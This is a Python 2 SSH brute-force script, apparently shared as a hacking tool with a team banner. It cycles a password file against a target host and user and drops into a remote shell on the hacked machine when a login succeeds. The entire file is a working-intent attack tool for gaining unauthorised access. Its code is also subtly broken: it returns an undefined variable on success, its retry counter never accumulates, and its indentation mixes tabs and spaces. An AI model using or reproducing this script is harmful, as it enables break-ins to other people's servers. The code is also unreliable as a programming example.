#!usr/bin/python 
#coded by badreddine chamkhi
#import zone  
import os
import argparse
import time
from platform import system
#clearscrn 
def clear():
    if system() == 'Linux':
        os.system("clear")
    if system() == 'Windows':
        os.system('cls')
        os.system('color a')
    else:
        pass
clear()
#pxssh 
try : 
	from pexpect import pxssh 
except : 
	print "Please Install pxssh library Then run The Script ..."
#banner
banner = '''
\033[1;44m[ SSH BruteForce\033[1;m|\033[1;42mC0ded By Badreddine Chamkhi\033[1;m|\033[1;41mAl Fallaga Team\033[1;m|\033[1;43mFallag Error105 ]\033[1;m
'''
print banner 
#realshit
def connect(host, user, password):
    global Found
    Fails = 0
    try:
        terma = pxssh.pxssh()
        terma.login(host, user, password)
        print 'Password Found: ' + password
	return s
    except Exception, e:
	if Fails > 5:
	    print "!!! Too Many Socket Timeouts" 
	    exit(0)
	elif 'read_nonblocking' in str(e):
	    Fails += 1
            time.sleep(5)
            return connect(host, user, password)
	elif 'synchronize with original prompt' in str(e):
	    time.sleep(1)
	    return connect(host, user, password)
	return None

def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("host", help="Specify Target Host")
    parser.add_argument("user", help="Specify Target User")
    parser.add_argument("file", help="Specify Password File")
    
    args = parser.parse_args()

    if args.host and args.user and args.file:
    	with open(args.file, 'r') as infile:
    	    for line in infile:
                password = line.strip('\r\n')
	        print "\033[1;41mTrying =>\033[1;m "+str(password)
                con = connect(args.host, args.user, password)
		if con:
		    print "\033[1;42m[ SSH connected, Q or q To quit :) ]\033[1;m"
		    command = raw_input(">")
		    while command != 'q' and command != 'Q':
			con.sendline (command)
            		con.prompt()
            		print con.before 
			command = raw_input(">")
    else:
        print parser.usage
        exit(0)

if __name__ == '__main__':
    main()



